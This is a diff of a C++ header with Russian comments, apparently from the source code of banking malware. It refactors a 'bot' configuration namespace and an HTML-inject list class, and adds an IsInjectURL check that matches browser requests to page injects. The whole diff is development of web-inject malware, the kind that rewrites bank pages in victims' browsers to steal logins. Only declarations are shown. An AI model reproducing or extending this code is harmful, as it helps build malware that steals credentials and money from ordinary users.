@@ -66,6 +66,7 @@ public:
 	bool LoadFromMem(LPVOID Buf, DWORD BufSize);
 	void ReleaseInjects(PList Injects);
 	bool GetInjectsForRequest(PRequest Request);
+    bool IsInjectURL(const char* URL, THTTPMethod Method = hmUnknown);
 
 	inline DWORD Count() const { return List::Count(FInjects); };
 	inline THTMLInject* Items(int Index) const { return (THTMLInject*)List::GetItem(FInjects, Index); }
@@ -156,20 +157,6 @@ public:
 
 
 
-//---------------------------------------------------------
-// TBotConfig -  Настройки работы бота
-//---------------------------------------------------------
-typedef struct TBotConfig_
-{
-	THTMLInjectList *HTMLInjects;  // Список инжектов (список элементов типа PHTMLInject)
-	RTL_CRITICAL_SECTION Lock;  // Критичиская секция блокировки конфига
-	PWCHAR LastConfigFile;      // Имя последнего загруженного файла
-	FILETIME ConfigTime;        // Время изменения загруженного файла
-} *PBotConfig_;
-
-
-
-
 //*********************************************************
 //  SetHTMLInjectEvent - установить метод обработки
 //		событий HTML инжекта
@@ -185,35 +172,29 @@ typedef struct TBotConfig_
 	void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event);
 #endif
 
+
+//*****************************************************************
+//  Методы для работы с гобальными данными конфига
+//*****************************************************************
 namespace Config
 {
-	// Функция создаёт структуру конфига
-//	PBotConfig Create();
-
-	// Функция уничтожает структуру конфига
-//	void Free(PBotConfig Cfg);
-
 	//*********************************************************
 	//	Initialize - Инициализировать глобальные
 	//  	настройки бота. Если указао имя файла FileName то
 	//  	настройки будут прочитаны из него, в противном
-	//  	случае настройки будут прочитаны из файла вшитого
-	//		в код бота.
+	//  	случае настройки будут прочитаны из файла имя
+	//      которого задано в коде бота.
 	//*********************************************************
-	TBotConfig* Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad);
-	TBotConfig* Initialize(PCHAR FileName);
+	TBotConfig* Initialize(PCHAR FileName = NULL);
 
 	// Функция возвращает указатель на конфиг бота
 	TBotConfig* GetConfig();
 
-	// Очистить конфиг
-	//void Clear(PBotConfig Config);
 
-	//  Функция возврашает имя файла по умолчанию
-	//
+	//  Функция возврашает имя файла конфига
 	string GetFileName(bool HightPriority = false);
 
-	//  Функция устанавливает имя файла по умолчанию
+	//  Функция устанавливает имя файла конфига
 	void SetFileName(const char *FileName);
 
 	// Загрузить конфиг
@@ -227,9 +208,6 @@ namespace Config
 
 	// Функция проверяет есть ли для указанного адреса инжект
 	bool IsInjectURL(PCHAR URL, THTTPMethod Method);
-
-	// Функция загружает конфиг из файла
-//	bool LoadConfigFromFile(TBotConfig *Config, PWCHAR FileName);
 }
 
 
